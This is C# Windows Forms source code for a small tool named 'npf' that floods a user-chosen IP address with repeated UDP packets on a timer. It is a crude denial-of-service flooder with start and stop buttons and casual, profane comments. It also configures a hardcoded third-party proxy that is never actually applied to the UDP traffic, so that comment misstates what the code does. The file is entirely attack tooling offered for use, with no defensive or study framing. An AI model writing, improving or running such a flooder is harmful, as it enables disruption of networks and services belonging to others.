using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace npf
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void textBox1_TextChanged(object sender, EventArgs e) // i really dont need this but for some reason the program breaks if i remove it so i have to keep it here
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string intervall = intervalTxt.Text;
            floodTimer.Interval = Int16.Parse(intervall);
            if (floodTimer.Enabled)
            {
                MessageBox.Show("Flooding is still in progress.");
            }
            else
            {
                MessageBox.Show("Flooding started.");
                floodTimer.Start();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (floodTimer.Enabled)
            {
                MessageBox.Show("Flooding stopped.");
                floodTimer.Stop();
            }
            else
            {
                MessageBox.Show("Flooding hasn't started yet, therefore nothing has been stopped.");
            }
        }
        public static bool CheckForInternetConnection() // this checks for internet
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        private void floodTimer_Tick(object sender, EventArgs e)
        {
            bool internetcon = CheckForInternetConnection(); // this checks the internet connection every second, it is not very efficient but i do not care
            if (internetcon)
            {
                flood();
            }
            else
            {
                MessageBox.Show("You do not have an internet connection, reconnect and try again.");
                System.Windows.Forms.Application.Exit();
            }
        }
        private void flood() // all the upcoming code happens every second or so, fucking end me
        {
            WebProxy myproxy = new WebProxy("139.99.135.214", 80); // this is the proxy setup, btw the server is located in america so yeah that may or may not be an issue depending on where you live
            UdpClient client = new UdpClient(); // this is just the udp client, nothing interesting
            string ipaddr = IPText.Text;
            try
            {
                client.Connect(ipaddr, 80); // this is where the fun starts 
                byte[] sendBytes = Encoding.ASCII.GetBytes(DataText.Text);
                client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
                client.AllowNatTraversal(true);
                client.DontFragment = true;
            }
            catch
            {
                const string errorMessage = "There was an error with npf.";
                const string errorCaption = "Ensure that you have an internet connection and that all the data is entered correctly.";
                MessageBox.Show(errorMessage, errorCaption,
                    MessageBoxButtons.OK);
            }
        }
    }
}
